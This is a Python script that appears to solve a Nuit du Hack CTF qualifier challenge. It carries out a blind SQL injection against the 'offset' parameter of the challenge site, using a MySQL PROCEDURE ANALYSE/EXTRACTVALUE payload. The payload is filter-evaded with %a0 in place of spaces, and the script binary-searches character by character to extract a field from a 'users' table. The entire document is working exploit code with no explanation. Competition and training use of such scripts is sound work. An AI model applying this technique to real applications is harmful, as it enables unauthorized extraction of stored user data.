import requests

def check(s):
  return b'1105' in s

payload = "1 Procedure Analyse (Extractvalue (0, case when (Select substr(c.b, {}, 1) <= 0x{:02x} From (Select 0x41 a,0x42 b Union Select * From users limit 1 offset 3)c) then 0x2f else 0x40 end), 1)#".replace(' ', '%a0').replace('#', '%23')
url = 'http://spacesec.quals.nuitduhack.com/index.php?offset='

result = ''
i = 1
while True:
  a = 0x7e
  b = -1
  while abs(a - b) > 1:
    mid = (a + b) // 2
    c = requests.get(url + payload.format(i, mid)).content
    if check(c):
      b = mid
    else:
      a = mid
  result += chr(a)
  print(i, result)
  i += 1
